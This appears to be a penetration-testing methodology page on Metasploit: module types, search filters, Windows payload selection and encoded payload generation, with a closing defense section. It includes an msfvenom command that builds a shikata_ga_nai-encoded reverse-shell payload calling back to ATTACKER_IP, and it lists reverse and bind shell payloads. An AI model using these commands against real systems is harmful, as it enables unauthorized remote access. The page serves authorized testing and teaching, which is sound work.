---
layout: page
title: "Metasploit"
subtitle: "Module types, searching, payload selection and encoded msfvenom output within the engagement workflow"
permalink: /methodology/shells-and-transfers/metasploit/
---

**Purpose:** use the Metasploit Framework within the engagement stages to find modules, choose payloads that suit the target, generate encoded payloads with msfvenom, and understand which module type to reach for at each step.

## Engagement structure

Metasploit fits into a staged workflow. Keep the stages in mind when deciding what to run:

1. **Enumeration**: identify hosts, services and versions.
2. **Preparation**: choose modules, generate payloads, and set up listeners and infrastructure.
3. **Exploitation**: deliver the payload through a vulnerability.
4. **Privilege escalation**: raise the level of access on the foothold.
5. **Post-exploitation**: gather data, pivot and maintain access within scope.

## Module types

| Type | Purpose |
|---|---|
| Auxiliary | Scanning, fuzzing, sniffing and administrative helpers |
| Encoders | Transform payloads so they remain intact at the destination |
| Exploits | Use a vulnerability to deliver a payload |
| NOPs | No-operation padding that keeps payload sizes consistent across attempts |
| Payloads | Code that runs on the target and calls back to establish a session |
| Plugins | Extra scripts loaded into msfconsole |
| Post | Modules for information gathering, pivoting and further post-exploitation |

## Searching and reviewing modules

Narrow a search with filters:

```text
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Before running a module, review its options and requirements against the target:

```text
info
```

Use `grep` inside msfconsole to chain filters over long lists. For example, to find Meterpreter payloads that use reverse TCP:

```text
grep meterpreter grep reverse_tcp
```

## Choosing a payload for Windows

| Payload | Use |
|---|---|
| `generic/shell_reverse_tcp` | Generic reverse listener, normal shell |
| `generic/shell_bind_tcp` | Generic bind listener, normal shell |
| `windows/x64/shell_reverse_tcp` | Single-piece normal shell, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Stager and stage, normal shell, reverse TCP |
| `windows/x64/meterpreter/$` | Meterpreter, with the variants listed under the same name |
| `windows/x64/powershell/$` | Interactive PowerShell session |
| `windows/x64/exec` | Runs one arbitrary command |

The `$` suffix means the payload has several variants. Use `show payloads` in a configured module to list them.

## Generating encoded payloads with msfvenom

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

- `-a` and `--platform` set architecture and OS.
- `-p` selects the payload, and `LHOST` and `LPORT` set the callback.
- `-b "\x00"` tells the encoder to avoid null bytes, which many exploit contexts cannot carry.
- `-e` selects the encoder, here `x86/shikata_ga_nai`.
- `-f` sets the output format.

In msfconsole, after setting a payload, list the encoders that suit it:

```text
show encoders
```

## Writing a custom module

When adapting a module, these library components cover the common needs:

| Function | Purpose |
|---|---|
| `Msf::Exploit::Remote::HttpClient` | HTTP client methods for exploiting an HTTP server |
| `Msf::Exploit::PhpEXE` | Builds a first-stage PHP payload |
| `Msf::Exploit::FileDropper` | Drops files on the target and removes them after the session |
| `Msf::Auxiliary::Report` | Writes results to the Metasploit database |

## What to look for

- The module rank and the CVE reference, which show how reliable the exploit is expected to be
- Whether the payload architecture matches the target
- Whether the chosen payload needs a stager, and whether the network path supports it

## Pitfalls

- Encoding does not change what a payload does. It changes the bytes, which may or may not affect signature matching. Do not assume an encoded payload is undetectable.
- A payload built with `-b` options that exclude bytes can still fail if the exploit context cannot handle the remaining bytes.
- Some Meterpreter scripts are deprecated in current releases. Prefer the post modules listed in [Pivoting: Meterpreter](/methodology/pivoting/meterpreter-pivoting/).

> Evasion attempts such as repeated encoding, archiving or packing are commonly signatured. Document each attempt and its result in the report, and do not treat a single bypass as proof that controls are absent.
{: .warning }

## Defense and prevention

Keep endpoint protection current and enable behavioural detection, which catches the process and network patterns that Meterpreter sessions produce regardless of encoding. Restrict outbound connections from servers, and monitor for sessions that reach unexpected ports. The detection methods are summarised in [Shell Detection and Mitigation](/methodology/shells-and-transfers/shell-detection-mitigation/).
